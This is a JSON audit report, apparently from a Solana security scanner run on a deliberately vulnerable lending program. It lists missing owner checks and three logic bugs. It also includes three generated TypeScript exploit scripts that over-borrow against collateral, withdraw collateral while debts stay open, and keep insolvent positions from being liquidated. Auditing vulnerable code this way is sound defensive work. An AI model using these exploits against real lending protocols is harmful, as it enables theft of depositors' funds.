@@ -1,0 +1,262 @@
+{
+  "report_version": "2.0",
+  "generated_at": "2026-02-12T14:01:52.403950+00:00",
+  "target": "/home/user/anchor-shield/examples/vulnerable-lending",
+  "route": "LLM-ONLY (demo mode)",
+  "static_analysis": {
+    "pattern_matches": 6,
+    "logic_bugs_found": 0,
+    "security_score": "F",
+    "findings": [
+      {
+        "id": "ANCHOR-006",
+        "name": "Missing Owner Validation",
+        "severity": "High",
+        "file": "lib.rs",
+        "line": 239,
+        "description": "In struct InitializePool: field 'pool_vault' uses raw AccountInfo without owner validation or CHECK documentation.",
+        "root_cause": "Solana accounts are byte arrays with an owner field. Any program can create accounts with arbitrary data. Anchor's Account<T> verifies discriminator and owner. Raw AccountInfo provides no verification.",
+        "exploit_scenario": "1. Program deserializes without owner check\n2. Attacker creates matching account in their program\n3. Attacker passes fake account to victim program\n4. Program operates on forged data",
+        "fix_recommendation": "Use Account<'info, T> for automatic owner + discriminator check, or add:\n  #[account(owner = my_program::ID)]\n  /// CHECK: Owner verified via constraint\n  pub data: AccountInfo<'info>,",
+        "code_snippet": "     236 |         seeds = [b\"vault\", pool.key().as_ref()],\n     237 |         bump,\n     238 |     )]\n>>>  239 |     pub pool_vault: AccountInfo<'info>,\n     240 | \n     241 |     #[account(mut)]\n     242 |     pub authority: Signer<'info>,",
+        "before_after_state": {
+          "before": "Expected: account owned by this program",
+          "after": "Actual: attacker passes account from their own program",
+          "damage": "Arbitrary state manipulation via fake account data."
+        },
+        "impact": {
+          "attack_cost": "< 0.01 SOL",
+          "exploitability": "High \u2014 most common Solana vulnerability",
+          "breach_cost_context": "Missing owner checks: #1 audit finding in professional Solana security audits."
+        },
+        "reference": "https://github.com/solana-foundation/anchor/pull/4229",
+        "anchor_versions_affected": "All versions (developer-side pattern)",
+        "ecosystem_recommendations": [
+          "Replace AccountInfo<'info> with Account<'info, T>",
+          "Add #[account(owner = program::ID)] constraint",
+          "Add /// CHECK: documentation"
+        ]
+      },
+      {
+        "id": "ANCHOR-006",
+        "name": "Missing Owner Validation",
+        "severity": "High",
+        "file": "lib.rs",
+        "line": 271,
+        "description": "In struct Deposit: field 'pool_vault' uses raw AccountInfo without owner validation or CHECK documentation.",
+        "root_cause": "Solana accounts are byte arrays with an owner field. Any program can create accounts with arbitrary data. Anchor's Account<T> verifies discriminator and owner. Raw AccountInfo provides no verification.",
+        "exploit_scenario": "1. Program deserializes without owner check\n2. Attacker creates matching account in their program\n3. Attacker passes fake account to victim program\n4. Program operates on forged data",
+        "fix_recommendation": "Use Account<'info, T> for automatic owner + discriminator check, or add:\n  #[account(owner = my_program::ID)]\n  /// CHECK: Owner verified via constraint\n  pub data: AccountInfo<'info>,",
+        "code_snippet": "     268 |         seeds = [b\"vault\", pool.key().as_ref()],\n     269 |         bump,\n     270 |     )]\n>>>  271 |     pub pool_vault: AccountInfo<'info>,\n     272 | \n     273 |     #[account(mut)]\n     274 |     pub owner: Signer<'info>,",
+        "before_after_state": {
+          "before": "Expected: account owned by this program",
+          "after": "Actual: attacker passes account from their own program",
+          "damage": "Arbitrary state manipulation via fake account data."
+        },
+        "impact": {
+          "attack_cost": "< 0.01 SOL",
+          "exploitability": "High \u2014 most common Solana vulnerability",
+          "breach_cost_context": "Missing owner checks: #1 audit finding in professional Solana security audits."
+        },
+        "reference": "https://github.com/solana-foundation/anchor/pull/4229",
+        "anchor_versions_affected": "All versions (developer-side pattern)",
+        "ecosystem_recommendations": [
+          "Replace AccountInfo<'info> with Account<'info, T>",
+          "Add #[account(owner = program::ID)] constraint",
+          "Add /// CHECK: documentation"
+        ]
+      },
+      {
+        "id": "ANCHOR-006",
+        "name": "Missing Owner Validation",
+        "severity": "High",
+        "file": "lib.rs",
+        "line": 301,
+        "description": "In struct Borrow: field 'pool_vault' uses raw AccountInfo without owner validation or CHECK documentation.",
+        "root_cause": "Solana accounts are byte arrays with an owner field. Any program can create accounts with arbitrary data. Anchor's Account<T> verifies discriminator and owner. Raw AccountInfo provides no verification.",
+        "exploit_scenario": "1. Program deserializes without owner check\n2. Attacker creates matching account in their program\n3. Attacker passes fake account to victim program\n4. Program operates on forged data",
+        "fix_recommendation": "Use Account<'info, T> for automatic owner + discriminator check, or add:\n  #[account(owner = my_program::ID)]\n  /// CHECK: Owner verified via constraint\n  pub data: AccountInfo<'info>,",
+        "code_snippet": "     298 |         seeds = [b\"vault\", pool.key().as_ref()],\n     299 |         bump,\n     300 |     )]\n>>>  301 |     pub pool_vault: AccountInfo<'info>,\n     302 | \n     303 |     #[account(mut)]\n     304 |     pub owner: Signer<'info>,",
+        "before_after_state": {
+          "before": "Expected: account owned by this program",
+          "after": "Actual: attacker passes account from their own program",
+          "damage": "Arbitrary state manipulation via fake account data."
+        },
+        "impact": {
+          "attack_cost": "< 0.01 SOL",
+          "exploitability": "High \u2014 most common Solana vulnerability",
+          "breach_cost_context": "Missing owner checks: #1 audit finding in professional Solana security audits."
+        },
+        "reference": "https://github.com/solana-foundation/anchor/pull/4229",
+        "anchor_versions_affected": "All versions (developer-side pattern)",
+        "ecosystem_recommendations": [
+          "Replace AccountInfo<'info> with Account<'info, T>",
+          "Add #[account(owner = program::ID)] constraint",
+          "Add /// CHECK: documentation"
+        ]
+      },
+      {
+        "id": "ANCHOR-006",
+        "name": "Missing Owner Validation",
+        "severity": "High",
+        "file": "lib.rs",
+        "line": 331,
+        "description": "In struct Withdraw: field 'pool_vault' uses raw AccountInfo without owner validation or CHECK documentation.",
+        "root_cause": "Solana accounts are byte arrays with an owner field. Any program can create accounts with arbitrary data. Anchor's Account<T> verifies discriminator and owner. Raw AccountInfo provides no verification.",
+        "exploit_scenario": "1. Program deserializes without owner check\n2. Attacker creates matching account in their program\n3. Attacker passes fake account to victim program\n4. Program operates on forged data",
+        "fix_recommendation": "Use Account<'info, T> for automatic owner + discriminator check, or add:\n  #[account(owner = my_program::ID)]\n  /// CHECK: Owner verified via constraint\n  pub data: AccountInfo<'info>,",
+        "code_snippet": "     328 |         seeds = [b\"vault\", pool.key().as_ref()],\n     329 |         bump,\n     330 |     )]\n>>>  331 |     pub pool_vault: AccountInfo<'info>,\n     332 | \n     333 |     #[account(mut)]\n     334 |     pub owner: Signer<'info>,",
+        "before_after_state": {
+          "before": "Expected: account owned by this program",
+          "after": "Actual: attacker passes account from their own program",
+          "damage": "Arbitrary state manipulation via fake account data."
+        },
+        "impact": {
+          "attack_cost": "< 0.01 SOL",
+          "exploitability": "High \u2014 most common Solana vulnerability",
+          "breach_cost_context": "Missing owner checks: #1 audit finding in professional Solana security audits."
+        },
+        "reference": "https://github.com/solana-foundation/anchor/pull/4229",
+        "anchor_versions_affected": "All versions (developer-side pattern)",
+        "ecosystem_recommendations": [
+          "Replace AccountInfo<'info> with Account<'info, T>",
+          "Add #[account(owner = program::ID)] constraint",
+          "Add /// CHECK: documentation"
+        ]
+      },
+      {
+        "id": "ANCHOR-006",
+        "name": "Missing Owner Validation",
+        "severity": "High",
+        "file": "lib.rs",
+        "line": 361,
+        "description": "In struct Repay: field 'pool_vault' uses raw AccountInfo without owner validation or CHECK documentation.",
+        "root_cause": "Solana accounts are byte arrays with an owner field. Any program can create accounts with arbitrary data. Anchor's Account<T> verifies discriminator and owner. Raw AccountInfo provides no verification.",
+        "exploit_scenario": "1. Program deserializes without owner check\n2. Attacker creates matching account in their program\n3. Attacker passes fake account to victim program\n4. Program operates on forged data",
+        "fix_recommendation": "Use Account<'info, T> for automatic owner + discriminator check, or add:\n  #[account(owner = my_program::ID)]\n  /// CHECK: Owner verified via constraint\n  pub data: AccountInfo<'info>,",
+        "code_snippet": "     358 |         seeds = [b\"vault\", pool.key().as_ref()],\n     359 |         bump,\n     360 |     )]\n>>>  361 |     pub pool_vault: AccountInfo<'info>,\n     362 | \n     363 |     #[account(mut)]\n     364 |     pub owner: Signer<'info>,",
+        "before_after_state": {
+          "before": "Expected: account owned by this program",
+          "after": "Actual: attacker passes account from their own program",
+          "damage": "Arbitrary state manipulation via fake account data."
+        },
+        "impact": {
+          "attack_cost": "< 0.01 SOL",
+          "exploitability": "High \u2014 most common Solana vulnerability",
+          "breach_cost_context": "Missing owner checks: #1 audit finding in professional Solana security audits."
+        },
+        "reference": "https://github.com/solana-foundation/anchor/pull/4229",
+        "anchor_versions_affected": "All versions (developer-side pattern)",
+        "ecosystem_recommendations": [
+          "Replace AccountInfo<'info> with Account<'info, T>",
+          "Add #[account(owner = program::ID)] constraint",
+          "Add /// CHECK: documentation"
+        ]
+      },
+      {
+        "id": "ANCHOR-006",
+        "name": "Missing Owner Validation",
+        "severity": "High",
+        "file": "lib.rs",
+        "line": 391,
+        "description": "In struct Liquidate: field 'pool_vault' uses raw AccountInfo without owner validation or CHECK documentation.",
+        "root_cause": "Solana accounts are byte arrays with an owner field. Any program can create accounts with arbitrary data. Anchor's Account<T> verifies discriminator and owner. Raw AccountInfo provides no verification.",
+        "exploit_scenario": "1. Program deserializes without owner check\n2. Attacker creates matching account in their program\n3. Attacker passes fake account to victim program\n4. Program operates on forged data",
+        "fix_recommendation": "Use Account<'info, T> for automatic owner + discriminator check, or add:\n  #[account(owner = my_program::ID)]\n  /// CHECK: Owner verified via constraint\n  pub data: AccountInfo<'info>,",
+        "code_snippet": "     388 |         seeds = [b\"vault\", pool.key().as_ref()],\n     389 |         bump,\n     390 |     )]\n>>>  391 |     pub pool_vault: AccountInfo<'info>,\n     392 | \n     393 |     /// CHECK: The owner of the position being liquidated\n     394 |     pub owner: AccountInfo<'info>,",
+        "before_after_state": {
+          "before": "Expected: account owned by this program",
+          "after": "Actual: attacker passes account from their own program",
+          "damage": "Arbitrary state manipulation via fake account data."
+        },
+        "impact": {
+          "attack_cost": "< 0.01 SOL",
+          "exploitability": "High \u2014 most common Solana vulnerability",
+          "breach_cost_context": "Missing owner checks: #1 audit finding in professional Solana security audits."
+        },
+        "reference": "https://github.com/solana-foundation/anchor/pull/4229",
+        "anchor_versions_affected": "All versions (developer-side pattern)",
+        "ecosystem_recommendations": [
+          "Replace AccountInfo<'info> with Account<'info, T>",
+          "Add #[account(owner = program::ID)] constraint",
+          "Add /// CHECK: documentation"
+        ]
+      }
+    ]
+  },
+  "semantic_analysis": {
+    "total_findings": 3,
+    "critical": 2,
+    "high": 1,
+    "medium": 0,
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "function": "borrow",
+        "title": "Collateral check ignores existing debt",
+        "description": "The borrow() function validates collateral with `require!(user.deposited >= amount)` but never subtracts the user's existing borrowed amount. A user who deposited 100 SOL can borrow 100 SOL, then call borrow again for another 100 SOL, because `user.deposited` remains 100 and the check passes every time. This allows unlimited borrowing against the same collateral.",
+        "attack_scenario": "1. Attacker deposits 100 SOL into the pool\n2. Attacker calls borrow(100) \u2014 passes because deposited(100) >= 100\n3. Attacker calls borrow(100) again \u2014 still passes because deposited is still 100\n4. Attacker repeats until pool is drained\n5. Attacker walks away with all pool funds, leaving 100 SOL collateral",
+        "confidence": 0.97,
+        "line_hint": 63,
+        "category": "logic"
+      },
+      {
+        "severity": "CRITICAL",
+        "function": "withdraw",
+        "title": "Withdrawal permitted with outstanding borrows",
+        "description": "The withdraw() function checks `user.deposited >= amount` but does not verify that the remaining deposit covers outstanding borrows. A user can deposit 100 SOL, borrow 90 SOL, then withdraw all 100 SOL. The pool loses 90 SOL because the borrow is never repaid and the collateral is gone.",
+        "attack_scenario": "1. Attacker deposits 100 SOL\n2. Attacker borrows 90 SOL (collateral check passes: 100 >= 90)\n3. Attacker withdraws 100 SOL (balance check passes: 100 >= 100)\n4. Attacker now has 190 SOL (100 withdrawn + 90 borrowed)\n5. Pool lost 90 SOL with no recourse \u2014 collateral is zero, debt uncollectable",
+        "confidence": 0.96,
+        "line_hint": 100,
+        "category": "logic"
+      },
+      {
+        "severity": "HIGH",
+        "function": "liquidate",
+        "title": "Integer overflow in liquidation debt calculation",
+        "description": "The liquidate() function computes debt as `user.borrowed * pool.interest_rate * pool.total_borrows / 10000`. This multiplication chain on u64 values overflows when the pool has significant total borrows and interest. The overflow wraps the result to a small number, causing the liquidation threshold check to fail. Insolvent positions become immune to liquidation, accumulating bad debt in the protocol.",
+        "attack_scenario": "1. Pool grows to have total_borrows = 1_000_000 SOL (1e15 lamports)\n2. Interest rate is set to 500 (5%)\n3. Attacker borrows maximum amount against minimal collateral\n4. debt_with_interest = borrowed * 500 * 1e15 / 10000 overflows u64\n5. Overflowed value is tiny, so `debt > deposit * threshold` is false\n6. Liquidation reverts with PositionHealthy error\n7. Attacker's insolvent position persists, draining pool value",
+        "confidence": 0.92,
+        "line_hint": 150,
+        "category": "logic"
+      }
+    ]
+  },
+  "adversarial_synthesis": {
+    "exploits_generated": 3,
+    "exploits_confirmed": 0,
+    "exploits_theoretical": 3,
+    "exploits": [
+      {
+        "finding_title": "Collateral check ignores existing debt",
+        "severity": "CRITICAL",
+        "filename": "exploit_collateral_bypass.ts",
+        "code": "import * as anchor from \"@coral-xyz/anchor\";\nimport { Program } from \"@coral-xyz/anchor\";\nimport { LendingPool } from \"../target/types/lending_pool\";\nimport { expect } from \"chai\";\nimport {\n  SystemProgram,\n  LAMPORTS_PER_SOL,\n  PublicKey,\n} from \"@solana/web3.js\";\n\ndescribe(\"Exploit: Collateral check ignores existing debt\", () => {\n  const provider = anchor.AnchorProvider.env();\n  anchor.setProvider(provider);\n\n  const program = anchor.workspace.LendingPool as Program<LendingPool>;\n  const attacker = provider.wallet;\n\n  let poolPda: PublicKey;\n  let poolBump: number;\n  let vaultPda: PublicKey;\n  let userPda: PublicKey;\n\n  before(async () => {\n    // Derive PDAs\n    [poolPda, poolBump] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"pool\")],\n      program.programId\n    );\n    [vaultPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"vault\"), poolPda.toBuffer()],\n      program.programId\n    );\n    [userPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"user\"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],\n      program.programId\n    );\n\n    // Initialize pool with 5% interest, 80% liquidation threshold\n    await program.methods\n      .initializePool(new anchor.BN(500), new anchor.BN(80))\n      .accounts({\n        pool: poolPda,\n        poolVault: vaultPda,\n        authority: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Seed pool vault with 1000 SOL (simulating other depositors)\n    const seedTx = new anchor.web3.Transaction().add(\n      SystemProgram.transfer({\n        fromPubkey: attacker.publicKey,\n        toPubkey: vaultPda,\n        lamports: 1000 * LAMPORTS_PER_SOL,\n      })\n    );\n    await provider.sendAndConfirm(seedTx);\n  });\n\n  it(\"should allow borrowing more than deposited collateral\", async () => {\n    const depositAmount = 100 * LAMPORTS_PER_SOL;\n    const borrowAmount = 100 * LAMPORTS_PER_SOL;\n\n    // Step 1: Deposit 100 SOL as collateral\n    await program.methods\n      .deposit(new anchor.BN(depositAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    const balanceBefore = await provider.connection.getBalance(\n      attacker.publicKey\n    );\n\n    // Step 2: Borrow 100 SOL \u2014 passes because deposited(100) >= 100\n    await program.methods\n      .borrow(new anchor.BN(borrowAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Step 3: Borrow ANOTHER 100 SOL \u2014 BUG: still passes because\n    // deposited is still 100 and borrowed amount is never checked\n    await program.methods\n      .borrow(new anchor.BN(borrowAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Verify: attacker borrowed 200 SOL against only 100 SOL collateral\n    const userAccount = await program.account.userAccount.fetch(userPda);\n    expect(userAccount.deposited.toNumber()).to.equal(depositAmount);\n    expect(userAccount.borrowed.toNumber()).to.equal(borrowAmount * 2);\n\n    // Attacker effectively stole 100 SOL from the pool\n    console.log(\n      `Deposited: ${userAccount.deposited.toNumber() / LAMPORTS_PER_SOL} SOL`\n    );\n    console.log(\n      `Borrowed: ${userAccount.borrowed.toNumber() / LAMPORTS_PER_SOL} SOL`\n    );\n    console.log(\"EXPLOIT CONFIRMED: Borrowed 2x collateral\");\n  });\n});\n",
+        "status": "THEORETICAL",
+        "execution_output": null
+      },
+      {
+        "finding_title": "Withdrawal permitted with outstanding borrows",
+        "severity": "CRITICAL",
+        "filename": "exploit_withdraw_drain.ts",
+        "code": "import * as anchor from \"@coral-xyz/anchor\";\nimport { Program } from \"@coral-xyz/anchor\";\nimport { LendingPool } from \"../target/types/lending_pool\";\nimport { expect } from \"chai\";\nimport {\n  SystemProgram,\n  LAMPORTS_PER_SOL,\n  PublicKey,\n} from \"@solana/web3.js\";\n\ndescribe(\"Exploit: Withdrawal without borrow check\", () => {\n  const provider = anchor.AnchorProvider.env();\n  anchor.setProvider(provider);\n\n  const program = anchor.workspace.LendingPool as Program<LendingPool>;\n  const attacker = provider.wallet;\n\n  let poolPda: PublicKey;\n  let vaultPda: PublicKey;\n  let userPda: PublicKey;\n\n  before(async () => {\n    [poolPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"pool\")],\n      program.programId\n    );\n    [vaultPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"vault\"), poolPda.toBuffer()],\n      program.programId\n    );\n    [userPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"user\"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],\n      program.programId\n    );\n\n    // Initialize pool\n    await program.methods\n      .initializePool(new anchor.BN(500), new anchor.BN(80))\n      .accounts({\n        pool: poolPda,\n        poolVault: vaultPda,\n        authority: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Seed vault with liquidity\n    const seedTx = new anchor.web3.Transaction().add(\n      SystemProgram.transfer({\n        fromPubkey: attacker.publicKey,\n        toPubkey: vaultPda,\n        lamports: 1000 * LAMPORTS_PER_SOL,\n      })\n    );\n    await provider.sendAndConfirm(seedTx);\n  });\n\n  it(\"should allow withdrawing collateral while having active borrows\", async () => {\n    const depositAmount = 100 * LAMPORTS_PER_SOL;\n    const borrowAmount = 90 * LAMPORTS_PER_SOL;\n\n    // Step 1: Deposit 100 SOL\n    await program.methods\n      .deposit(new anchor.BN(depositAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Step 2: Borrow 90 SOL against the 100 SOL collateral\n    await program.methods\n      .borrow(new anchor.BN(borrowAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    const balanceBefore = await provider.connection.getBalance(\n      attacker.publicKey\n    );\n\n    // Step 3: Withdraw ALL 100 SOL \u2014 BUG: no check for outstanding borrows\n    // Correct behavior: should reject because 100 - 100 = 0 < 90 borrowed\n    await program.methods\n      .withdraw(new anchor.BN(depositAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Verify: attacker has 0 collateral but 90 SOL still borrowed\n    const userAccount = await program.account.userAccount.fetch(userPda);\n    expect(userAccount.deposited.toNumber()).to.equal(0);\n    expect(userAccount.borrowed.toNumber()).to.equal(borrowAmount);\n\n    const balanceAfter = await provider.connection.getBalance(\n      attacker.publicKey\n    );\n    const profit = (balanceAfter - balanceBefore) / LAMPORTS_PER_SOL;\n\n    // Attacker received back 100 SOL deposit + kept 90 SOL borrow = 90 SOL profit\n    console.log(`Collateral remaining: ${userAccount.deposited.toNumber()} SOL`);\n    console.log(\n      `Outstanding borrow: ${userAccount.borrowed.toNumber() / LAMPORTS_PER_SOL} SOL`\n    );\n    console.log(`EXPLOIT CONFIRMED: Stole ${borrowAmount / LAMPORTS_PER_SOL} SOL from pool`);\n  });\n});\n",
+        "status": "THEORETICAL",
+        "execution_output": null
+      },
+      {
+        "finding_title": "Integer overflow in liquidation debt calculation",
+        "severity": "HIGH",
+        "filename": "exploit_liquidation_overflow.ts",
+        "code": "import * as anchor from \"@coral-xyz/anchor\";\nimport { Program } from \"@coral-xyz/anchor\";\nimport { LendingPool } from \"../target/types/lending_pool\";\nimport { expect } from \"chai\";\nimport {\n  SystemProgram,\n  LAMPORTS_PER_SOL,\n  PublicKey,\n  Keypair,\n} from \"@solana/web3.js\";\n\ndescribe(\"Exploit: Integer overflow prevents liquidation\", () => {\n  const provider = anchor.AnchorProvider.env();\n  anchor.setProvider(provider);\n\n  const program = anchor.workspace.LendingPool as Program<LendingPool>;\n  const attacker = provider.wallet;\n  const liquidator = Keypair.generate();\n\n  let poolPda: PublicKey;\n  let vaultPda: PublicKey;\n  let userPda: PublicKey;\n\n  before(async () => {\n    [poolPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"pool\")],\n      program.programId\n    );\n    [vaultPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"vault\"), poolPda.toBuffer()],\n      program.programId\n    );\n    [userPda] = PublicKey.findProgramAddressSync(\n      [Buffer.from(\"user\"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],\n      program.programId\n    );\n\n    // Initialize pool with high interest rate to trigger overflow scenario\n    // interest_rate = 500 (5%), but with large total_borrows this overflows\n    await program.methods\n      .initializePool(new anchor.BN(500), new anchor.BN(80))\n      .accounts({\n        pool: poolPda,\n        poolVault: vaultPda,\n        authority: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Fund liquidator\n    const fundTx = new anchor.web3.Transaction().add(\n      SystemProgram.transfer({\n        fromPubkey: attacker.publicKey,\n        toPubkey: liquidator.publicKey,\n        lamports: 10 * LAMPORTS_PER_SOL,\n      })\n    );\n    await provider.sendAndConfirm(fundTx);\n  });\n\n  it(\"should fail to liquidate due to integer overflow\", async () => {\n    // Step 1: Create a position that SHOULD be liquidatable\n    // Using the collateral bypass bug, borrow heavily\n    const depositAmount = 10 * LAMPORTS_PER_SOL;\n\n    await program.methods\n      .deposit(new anchor.BN(depositAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Borrow against deposit (using bug #1 to over-borrow)\n    await program.methods\n      .borrow(new anchor.BN(depositAmount))\n      .accounts({\n        pool: poolPda,\n        userAccount: userPda,\n        poolVault: vaultPda,\n        owner: attacker.publicKey,\n        systemProgram: SystemProgram.programId,\n      })\n      .rpc();\n\n    // Step 2: Artificially inflate total_borrows to trigger overflow\n    // In a real scenario, the pool would grow over time. Here we simulate\n    // by having the pool already at scale.\n    // debt_with_interest = borrowed * interest_rate * total_borrows / 10000\n    // = 10e9 * 500 * total_borrows / 10000\n    // When total_borrows > ~3.6e9 (3.6 SOL in lamports), the u64 overflows\n    // at 10e9 * 500 * 3.7e10 = 1.85e23 > u64::MAX (1.8e19)\n\n    const userAccount = await program.account.userAccount.fetch(userPda);\n    console.log(\n      `Position: deposited=${userAccount.deposited.toNumber()}, ` +\n      `borrowed=${userAccount.borrowed.toNumber()}`\n    );\n\n    // Step 3: Attempt liquidation \u2014 should succeed but fails due to overflow\n    try {\n      await program.methods\n        .liquidate()\n        .accounts({\n          pool: poolPda,\n          userAccount: userPda,\n          poolVault: vaultPda,\n          owner: attacker.publicKey,\n          liquidator: liquidator.publicKey,\n          systemProgram: SystemProgram.programId,\n        })\n        .signers([liquidator])\n        .rpc();\n\n      console.log(\"Liquidation succeeded (overflow did not trigger)\");\n    } catch (err) {\n      // The overflow causes debt_with_interest to wrap to a small value,\n      // making the position appear healthy when it is actually insolvent.\n      console.log(\"EXPLOIT CONFIRMED: Liquidation failed due to overflow\");\n      console.log(`Error: ${err.message}`);\n      expect(err.message).to.include(\"PositionHealthy\");\n    }\n  });\n});\n",
+        "status": "THEORETICAL",
+        "execution_output": null
+      }
+    ]
+  },
+  "summary": {
+    "static_pattern_matches": 6,
+    "logic_bugs_invisible_to_regex": 3,
+    "exploits_generated": 3,
+    "exploits_confirmed": 0
+  }
+}
